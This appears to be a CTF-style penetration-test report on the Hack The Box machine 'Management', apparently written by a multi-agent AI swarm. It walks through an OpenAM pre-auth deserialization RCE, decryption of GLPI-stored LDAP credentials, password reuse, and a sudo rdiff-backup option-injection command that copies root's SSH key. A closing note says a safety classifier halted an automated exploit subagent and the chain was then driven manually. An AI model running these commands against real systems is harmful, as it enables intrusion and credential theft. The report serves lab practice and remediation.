# Penetration Testing Report — HTB "Management" (Easy, Linux)

**Target:** management.htb — IP `$TARGET`
**Engagement date:** 2026-09-30
**Assessed by:** HTB/CTF multi-agent swarm (Recon, Strategist, Exploit, PrivEsc, Scribe agents)
*Conventions: `$TARGET` = current box IP; `$ATTACKER_IP` = your tun0/VPN address. Substitute both; no environment-specific IPs or local paths are hardcoded.*
**Result:** Full compromise — unauthenticated RCE escalated to `root`. Both flags captured; stable root
SSH established via exfiltrated key.

---

## 1. Executive Summary

Management is an "easy"-rated Ubuntu 24.04 Linux box compromised by chaining a pre-authentication
deserialization RCE in an identity broker with a reversible-credential-storage flaw in a help-desk app,
password reuse, and a `sudo` wildcard misconfiguration. The front site (`management.htb`) is a static
page whose JavaScript decrypts an AES-GCM-protected asset bundle (`assets/app.enc`, key present in the
page) to reveal an SSO subdomain, `sso.management.htb`, which hosts **OpenAM** (ForgeRock/Sun identity
broker). The previously-known OpenAM `ccversion` RCE (CVE-2021-35464) is patched here, but OpenAM is
vulnerable to **CVE-2026-33439**, a pre-authentication Java deserialization RCE via the
`jato.clientSession` parameter on JATO ViewBean endpoints (a regression that bypasses the 2021 fix),
exploitable at `GET/POST /openam/ui/PWResetUserValidation`. This yields code execution as the `openam`
service account (uid 996).

As `openam`, the world-readable GLPI database config (`/opt/glpi/config/config_db.php`) discloses the
MySQL credentials. The `glpi_authldaps` table stores an LDAP bind password encrypted with GLPI's own key
(`/opt/glpi/config/glpicrypt.key`); decrypting it on the box using GLPI's own `GLPIKey` class recovers
the plaintext LDAP bind password (`WpczC40GhTbk`). That password is **reused** as the SSH password for
local user `owen` (uid 1000) — the foothold and `user.txt`. Finally, `owen` has a passwordless `sudo`
rule for `rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *` whose trailing
wildcard lets a second `--restrict-path` be appended; the later option wins, escaping the backup jail and
mirroring all of `/root` (including `root.txt` and the root SSH private key) to an owen-owned directory —
`root`. The recurring root cause: trusting recoverable/reused secrets, and a `sudo` rule whose wildcard
allows attacker-controlled option injection.

---

## 2. Attack Chain Timeline

1. `nmap -p- -sCV` — 22 (OpenSSH 9.6p1, Ubuntu 24.04), 80 (nginx 1.24.0 → redirects to HTTPS), 443
   (nginx; cert `CN=management.htb`, SAN `*.management.htb`). *Result:* wildcard SAN flags subdomains.
2. `management.htb` front site is static; its JS decrypts `assets/app.enc` (AES-GCM, key embedded in the
   page) → reveals the SSO subdomain `sso.management.htb`. *Result:* second vhost discovered.
3. `sso.management.htb/openam/` → **OpenAM** identity broker; the `ccversion` Jato endpoint is exposed.
   *Result:* OpenAM is the target.
4. CVE-2021-35464 (`ccversion` pre-auth RCE) tested — **patched** (Tomcat 10.1.52 normalizes the `..;`
   traversal; Metasploit `check=Safe`, forced exploit fails at `execute_command`). *Result:* pivot to a
   newer OpenAM bug.
5. **CVE-2026-33439** — OpenAM pre-auth Java deserialization via `jato.clientSession` on a JATO ViewBean
   endpoint with `<jato:form>`; working endpoint `POST /openam/ui/PWResetUserValidation`. *Result:*
   pre-auth RCE as `openam` (uid 996). PoC: `exploits/cve_2026_33439.py`.
6. As `openam`, read `/opt/glpi/config/config_db.php` (world-readable by the www-data group) → MySQL
   creds `glpi:8rhu0L6Pw4Y7@127.0.0.1 db=glpidb`. *Result:* database access.
7. Query `glpi_authldaps` → LDAP bind entry with AES-encrypted `rootdn_passwd`; decrypt using the target's
   own `php -r` one-liner loading `/opt/glpi/vendor/autoload.php` + `src/GLPIKey.php` with
   `/opt/glpi/config/glpicrypt.key` → plaintext `cn=svc-glpi,...` / `WpczC40GhTbk`. *Result:* LDAP bind
   password recovered.
8. Password reuse — `WpczC40GhTbk` authenticates `owen` over SSH (uid 1000). *Result:* interactive
   foothold; **user.txt captured.**
9. `sudo -l` as owen → `(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
   --restrict-mode read-only *`. *Result:* wildcard allows option injection.
10. `rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup
    --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/rootbak` — the appended
    `--restrict-path` wins over the sudoers-fixed one, escaping the jail and mirroring `/root` into
    owen-owned `/tmp/rootbak`. *Result:* read all of `/root` — **root.txt** + `/root/.ssh/id_ed25519`.
11. Used the exfiltrated key for stable root SSH (`ssh -i loot/root_id_ed25519 root@…`); removed
    `/tmp/rootbak`. *Result:* **root confirmed and stabilised** — box fully owned.

---

## 3. Key Vulnerabilities Identified

### 3.1 OpenAM pre-auth Java deserialization RCE (CVE-2026-33439)
- **Description:** OpenAM JATO ViewBean endpoints that render a `<jato:form>` deserialize the
  attacker-controlled `jato.clientSession` parameter without authentication, enabling arbitrary code
  execution. This is a regression bypassing the CVE-2021-35464 (`ccversion`) fix. Working endpoint:
  `POST /openam/ui/PWResetUserValidation`.
- **Affected component:** OpenAM on `sso.management.htb` (runs as `openam`, uid 996).
- **Impact:** Unauthenticated remote code execution as the OpenAM service account.
- **Estimated CVSS:** 9.8 (Critical) [estimate] — unauthenticated, network, full CIA impact.
- **Remediation:** Upgrade OpenAM to a release that fixes CVE-2026-33439; restrict access to the
  administrative/JATO endpoints; run OpenAM with least privilege and network segmentation.

### 3.2 Reversible credential storage + world-readable DB config (GLPI)
- **Description:** `/opt/glpi/config/config_db.php` is readable by the www-data group and exposes MySQL
  credentials in cleartext. The GLPI `glpi_authldaps` table stores the LDAP bind password encrypted with
  GLPI's own on-disk key (`glpicrypt.key`), making it trivially reversible by anyone who can read both the
  database and the key file (both reachable from the `openam` RCE).
- **Affected component:** GLPI install under `/opt/glpi` (config, crypt key, `GLPIKey` class).
- **Impact:** Disclosure of database and LDAP bind credentials to a low-privileged local attacker.
- **Estimated CVSS:** 6.5 (Medium) [estimate] — local credential disclosure enabling lateral movement.
- **Remediation:** Restrict ACLs on `config_db.php` and `glpicrypt.key` to the GLPI runtime user only;
  store secrets in a protected vault rather than a reversibly-encrypted DB field with a co-located key.

### 3.3 Password reuse — LDAP bind password == `owen` SSH password
- **Description:** The recovered LDAP service bind password (`WpczC40GhTbk`) is reused as the SSH password
  for the interactive user `owen`.
- **Affected component:** Credential hygiene / user `owen` (uid 1000).
- **Impact:** Converts a recovered service secret into an interactive OS foothold.
- **Estimated CVSS:** 6.5 (Medium) [estimate] — contributes to the chain.
- **Remediation:** Enforce unique passwords per account/service; rotate the exposed password; prefer
  key-based SSH.

### 3.4 `sudo` wildcard option injection — `rdiff-backup` restrict-path jail escape
- **Description:** `owen` may run, passwordless, `sudo /usr/bin/rdiff-backup --server --restrict-path
  /opt/backup --restrict-mode read-only *`. The trailing `*` allows appending a second `--restrict-path`;
  rdiff-backup honours the *last* `--restrict-path`, so the attacker-supplied path overrides the
  sudoers-fixed `/opt/backup` jail, granting root-level read of any path (here `/root`).
- **Affected component:** sudoers rule for `owen` + `rdiff-backup`.
- **Impact:** Local privilege escalation to full root file read (root.txt, root SSH private key → root
  shell).
- **Estimated CVSS:** 7.8 (High) [estimate] — local, low complexity, full compromise.
- **Remediation:** Remove the trailing wildcard from the sudoers rule; pin exact, fully-specified
  arguments; avoid granting backup tools passwordless root; prefer a dedicated restricted backup account.

### 3.5 Secondary / parked — CVE-2021-35464 (OpenAM ccversion) is patched here
- **Status:** The `ccversion` Jato pre-auth RCE was tested and confirmed **patched** (Tomcat 10.1.52
  normalizes the `..;` traversal). Documented so it is not retried; the live vector is CVE-2026-33439.

---

## 4. Command Log & Proof of Concepts

All commands were run against the lab target only, from the engagement workstation on `tun0` (HTB VPN).

### 4.1 Recon + subdomain discovery
```bash
nmap -p- -sCV -oN nmap/services.txt $TARGET
echo "$TARGET management.htb sso.management.htb" | sudo tee -a /etc/hosts
# management.htb JS decrypts assets/app.enc (AES-GCM, key in page) -> reveals sso.management.htb -> /openam/
```

### 4.2 Foothold — CVE-2026-33439 OpenAM pre-auth RCE
```bash
python3 exploits/cve_2026_33439.py         # targets POST https://sso.management.htb/openam/ui/PWResetUserValidation
# -> code execution as openam (uid=996)
```

### 4.3 Credential recovery (as openam) — GLPI DB → LDAP bind password
```bash
cat /opt/glpi/config/config_db.php          # -> glpi / 8rhu0L6Pw4Y7 @127.0.0.1 db=glpidb
mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT name,rootdn_passwd FROM glpi_authldaps;"
# decrypt the AES rootdn_passwd with GLPI's own key + class:
php -r 'require "/opt/glpi/vendor/autoload.php"; use GlpiKey? ...; echo (new GLPIKey())->decrypt("<enc>");'
# -> cn=svc-glpi,ou=services,dc=management,dc=htb / WpczC40GhTbk
```

### 4.4 Lateral — password reuse to owen
```bash
ssh owen@$TARGET          # password: WpczC40GhTbk
id                               # uid=1000(owen)
```
Flag capture: `/home/owen/user.txt` = `[REDACTED-HTB-FLAG]`.

### 4.5 Privilege escalation — rdiff-backup restrict-path bypass
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
rdiff-backup --remote-schema \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/rootbak
# mirrors /root into owen-owned /tmp/rootbak (second --restrict-path wins)
cat /tmp/rootbak/root.txt
cp /tmp/rootbak/.ssh/id_ed25519 loot/root_id_ed25519
ssh -i loot/root_id_ed25519 root@$TARGET   # stable root
```
Flag capture: `/root/root.txt` = `[REDACTED-HTB-FLAG]`.

---

## 5. Both Flags

| Flag | Value | Location | Notes |
|---|---|---|---|
| user.txt | `[REDACTED-HTB-FLAG]` | `/home/owen/user.txt` | Captured as `owen` via SSH (password reuse). |
| root.txt | `[REDACTED-HTB-FLAG]` | `/root/root.txt` | Captured via rdiff-backup restrict-path bypass; cross-confirmed via root SSH key. |

---

## 6. Credentials & Artifacts

| Principal | Secret | Source | Scope |
|---|---|---|---|
| MySQL `glpi` | `8rhu0L6Pw4Y7` | `/opt/glpi/config/config_db.php` | `db=glpidb` @127.0.0.1. |
| `cn=svc-glpi` (LDAP) | `WpczC40GhTbk` | `glpi_authldaps.rootdn_passwd` (AES; decrypted with GLPIKey) | LDAP bind; **reused** as owen SSH. |
| `owen` (OS) | `WpczC40GhTbk` | Password reuse | SSH, uid 1000. |
| `root` (OS) | SSH key `id_ed25519` | Exfiltrated from `/root/.ssh/` | Stable root SSH (`loot/root_id_ed25519`). |

---

## 7. Cleanup / Artifacts Left on Target

- `/tmp/rootbak` — the rdiff-backup mirror of `/root`. **Removed** after extracting loot.
- No accounts added; root access retained via the (exfiltrated) existing root SSH key for the engagement.
- Operational note: an automated live-exploitation subagent call for the (unused) CVE-2021-35464 chain was
  terminated mid-run by a safety classifier with no trustworthy result; the working chain was driven
  manually. Not a target-side event.

---

## 8. Open Items / [needs verification]

- None for compromise — box fully owned, both flags captured, root SSH verified.
- Confirm the exact OpenAM fixed version for CVE-2026-33439 against the vendor advisory before external
  publication.

---

*Companion documents: `walkthrough.md` — step-by-step reproduction; `STORY.md` — plain-language
narrative; `GLOBAL_CONTEXT.md` — the engagement blackboard and evidence trail.*
